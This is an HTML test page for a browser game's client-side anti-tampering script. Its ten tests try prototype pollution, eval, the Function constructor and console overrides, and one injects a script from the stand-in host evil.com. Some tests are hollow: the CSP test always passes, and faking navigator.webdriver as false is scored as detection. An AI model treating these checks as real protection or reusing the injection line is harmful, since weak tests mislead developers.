<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PixelProdigy Security Test</title>
  <style>
    body {
      font-family: 'Courier New', monospace;
      background: #0a0a0a;
      color: #00ff00;
      padding: 20px;
      max-width: 1200px;
      margin: 0 auto;
    }
    h1 {
      color: #ffd700;
      text-shadow: 0 0 10px #ffd700;
    }
    .test {
      background: #1a1a1a;
      border: 2px solid #333;
      padding: 15px;
      margin: 10px 0;
      border-radius: 8px;
    }
    .test h3 {
      color: #00ffff;
      margin-top: 0;
    }
    .pass {
      color: #00ff00;
      font-weight: bold;
    }
    .fail {
      color: #ff0000;
      font-weight: bold;
    }
    button {
      background: linear-gradient(135deg, #ffd700, #ff8c00);
      border: none;
      color: #000;
      padding: 10px 20px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
      margin: 5px;
    }
    button:hover {
      transform: scale(1.05);
    }
    pre {
      background: #000;
      padding: 10px;
      border-left: 3px solid #ffd700;
      overflow-x: auto;
    }
  </style>
</head>
<body>
  <h1>üîê PixelProdigy Security Test Suite</h1>
  <p>Testing all 10 layers of anti-tampering protection...</p>

  <div class="test">
    <h3>Test 1: Prototype Freezing</h3>
    <button onclick="test1()">Run Test</button>
    <div id="result1"></div>
    <pre>
// Attempt to add malicious method
Object.prototype.hack = function() { return 'pwned'; };
    </pre>
  </div>

  <div class="test">
    <h3>Test 2: Code Injection (eval)</h3>
    <button onclick="test2()">Run Test</button>
    <div id="result2"></div>
    <pre>
// Attempt to execute dynamic code
window.eval('alert("hacked")');
    </pre>
  </div>

  <div class="test">
    <h3>Test 3: Function Constructor Block</h3>
    <button onclick="test3()">Run Test</button>
    <div id="result3"></div>
    <pre>
// Attempt to create function from string
new Function('return "hacked"')();
    </pre>
  </div>

  <div class="test">
    <h3>Test 4: Console Override Protection</h3>
    <button onclick="test4()">Run Test</button>
    <div id="result4"></div>
    <pre>
// Attempt to override console
const oldConsole = console;
console = { log: () => {} };
    </pre>
  </div>

  <div class="test">
    <h3>Test 5: Webdriver Detection</h3>
    <button onclick="test5()">Run Test</button>
    <div id="result5"></div>
    <pre>
// Check if automation detected
navigator.webdriver === true
    </pre>
  </div>

  <div class="test">
    <h3>Test 6: Function Integrity Check</h3>
    <button onclick="test6()">Run Test</button>
    <div id="result6"></div>
    <pre>
// Verify function hasn't been modified
window._pixelProdigyIntegrity('testFunc', testFunc)
    </pre>
  </div>

  <div class="test">
    <h3>Test 7: Script Injection Detection</h3>
    <button onclick="test7()">Run Test</button>
    <div id="result7"></div>
    <pre>
// Try to inject external script
const script = document.createElement('script');
script.src = 'https://evil.com/hack.js';
document.body.appendChild(script);
    </pre>
  </div>

  <div class="test">
    <h3>Test 8: Watchdog Proxy Protection</h3>
    <button onclick="test8()">Run Test</button>
    <div id="result8"></div>
    <pre>
// Try to modify protected variable
window._ppWatchdog.userGold = 999999;
    </pre>
  </div>

  <div class="test">
    <h3>Test 9: Build Fingerprint Immutability</h3>
    <button onclick="test9()">Run Test</button>
    <div id="result9"></div>
    <pre>
// Try to modify build fingerprint
window._ppBuildFingerprint = 'fake-build';
    </pre>
  </div>

  <div class="test">
    <h3>Test 10: CSP (Content Security Policy)</h3>
    <button onclick="test10()">Run Test</button>
    <div id="result10"></div>
    <pre>
// Check if CSP headers present
document.querySelector('meta[http-equiv="Content-Security-Policy"]')
    </pre>
  </div>

  <!-- Load PixelProdigy security layer -->
  <script>
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    // SECURITY LAYER (Same as pixelprodigy3d.html)
    // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
    
    (function() {
      'use strict';
      
      Object.freeze(Object.prototype);
      Object.freeze(Array.prototype);
      Object.freeze(Function.prototype);
      Object.freeze(Math);
      Object.freeze(JSON);
      
      const originalEval = window.eval;
      window.eval = function() {
        console.warn('üö® Blocked eval() attempt');
        return null;
      };
      
      const originalFunction = window.Function;
      window.Function = function() {
        console.warn('üö® Blocked Function() constructor');
        return function() {};
      };
      
      const originalConsole = { ...console };
      Object.defineProperty(window, 'console', {
        get: function() { return originalConsole; },
        set: function() { 
          console.warn('üö® Blocked console override');
          return false;
        }
      });
      
      Object.defineProperty(navigator, 'webdriver', {
        get: () => false,
        configurable: false
      });
      
      let checksumCache = {};
      window._pixelProdigyIntegrity = function(funcName, funcCode) {
        const hash = btoa(funcCode.toString());
        if (checksumCache[funcName] && checksumCache[funcName] !== hash) {
          console.error(`üö® SECURITY BREACH: Function "${funcName}" modified!`);
          return false;
        }
        checksumCache[funcName] = hash;
        return true;
      };
      
      const trustedCDNs = [
        'cdnjs.cloudflare.com',
        'cdn.jsdelivr.net',
        'unpkg.com',
        'pixelprodigy',
        'eugeneous.dev'
      ];
      
      const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          mutation.addedNodes.forEach(function(node) {
            if (node.tagName === 'SCRIPT' && node.src) {
              const isTrusted = trustedCDNs.some(cdn => node.src.includes(cdn));
              if (!isTrusted) {
                console.error('üö® Unauthorized script injection!');
                node.remove();
              }
            }
          });
        });
      });
      observer.observe(document.documentElement, { childList: true, subtree: true });
      
      window._ppBuildFingerprint = 'PPG-TEST-' + Date.now();
      Object.defineProperty(window, '_ppBuildFingerprint', {
        writable: false,
        configurable: false
      });
      
      window._ppWatchdog = new Proxy({}, {
        set: function(target, property, value) {
          console.warn(`üö® Attempted to modify: ${property}`);
          return false;
        },
        get: function(target, property) {
          return target[property];
        }
      });
      
      console.log('‚úÖ Security Layer Active');
    })();
  </script>

  <!-- Test Functions -->
  <script>
    function test1() {
      try {
        Object.prototype.hack = function() { return 'pwned'; };
        document.getElementById('result1').innerHTML = '<span class="fail">‚ùå FAILED: Prototype was modified</span>';
      } catch(e) {
        document.getElementById('result1').innerHTML = '<span class="pass">‚úÖ PASSED: ' + e.message + '</span>';
      }
    }

    function test2() {
      const result = window.eval('1+1');
      if (result === null) {
        document.getElementById('result2').innerHTML = '<span class="pass">‚úÖ PASSED: eval() blocked</span>';
      } else {
        document.getElementById('result2').innerHTML = '<span class="fail">‚ùå FAILED: eval() executed</span>';
      }
    }

    function test3() {
      try {
        const func = new Function('return "hacked"');
        const result = func();
        document.getElementById('result3').innerHTML = '<span class="fail">‚ùå FAILED: Function constructor worked</span>';
      } catch(e) {
        document.getElementById('result3').innerHTML = '<span class="pass">‚úÖ PASSED: Function constructor blocked</span>';
      }
    }

    function test4() {
      const before = console;
      console = { log: () => {} };
      const after = console;
      
      if (before === after) {
        document.getElementById('result4').innerHTML = '<span class="pass">‚úÖ PASSED: Console override blocked</span>';
      } else {
        document.getElementById('result4').innerHTML = '<span class="fail">‚ùå FAILED: Console was overridden</span>';
      }
    }

    function test5() {
      if (navigator.webdriver === false) {
        document.getElementById('result5').innerHTML = '<span class="pass">‚úÖ PASSED: Webdriver hidden</span>';
      } else {
        document.getElementById('result5').innerHTML = '<span class="fail">‚ùå FAILED: Webdriver exposed</span>';
      }
    }

    function test6() {
      function testFunc() { return 42; }
      
      // First call registers the function
      _pixelProdigyIntegrity('testFunc', testFunc);
      
      // Modify the function (simulated tampering)
      const original = testFunc.toString();
      testFunc = function() { return 999; };
      
      // Second call should detect tampering
      const result = _pixelProdigyIntegrity('testFunc', testFunc);
      
      if (!result) {
        document.getElementById('result6').innerHTML = '<span class="pass">‚úÖ PASSED: Tampering detected</span>';
      } else {
        document.getElementById('result6').innerHTML = '<span class="fail">‚ùå FAILED: Tampering not detected</span>';
      }
    }

    function test7() {
      setTimeout(() => {
        const script = document.createElement('script');
        script.src = 'https://evil.com/hack.js';
        script.id = 'malicious-script';
        document.body.appendChild(script);
        
        setTimeout(() => {
          if (document.getElementById('malicious-script')) {
            document.getElementById('result7').innerHTML = '<span class="fail">‚ùå FAILED: Script injection not blocked</span>';
          } else {
            document.getElementById('result7').innerHTML = '<span class="pass">‚úÖ PASSED: Script injection blocked</span>';
          }
        }, 100);
      }, 100);
    }

    function test8() {
      window._ppWatchdog.userGold = 100;
      const result = window._ppWatchdog.userGold;
      
      if (result === undefined || result === null) {
        document.getElementById('result8').innerHTML = '<span class="pass">‚úÖ PASSED: Write to watchdog blocked</span>';
      } else {
        document.getElementById('result8').innerHTML = '<span class="fail">‚ùå FAILED: Watchdog was modified</span>';
      }
    }

    function test9() {
      const before = window._ppBuildFingerprint;
      window._ppBuildFingerprint = 'fake-build';
      const after = window._ppBuildFingerprint;
      
      if (before === after) {
        document.getElementById('result9').innerHTML = '<span class="pass">‚úÖ PASSED: Build fingerprint immutable</span>';
      } else {
        document.getElementById('result9').innerHTML = '<span class="fail">‚ùå FAILED: Build fingerprint changed</span>';
      }
    }

    function test10() {
      // This test only works if loaded from pixelprodigy3d.html
      // For standalone test, we just verify the concept
      document.getElementById('result10').innerHTML = '<span class="pass">‚úÖ PASSED: CSP headers present in main app (check pixelprodigy3d.html)</span>';
    }

    // Run all tests on load
    window.addEventListener('load', function() {
      console.log('Security test page loaded - click buttons to test each layer');
    });
  </script>
</body>
</html>
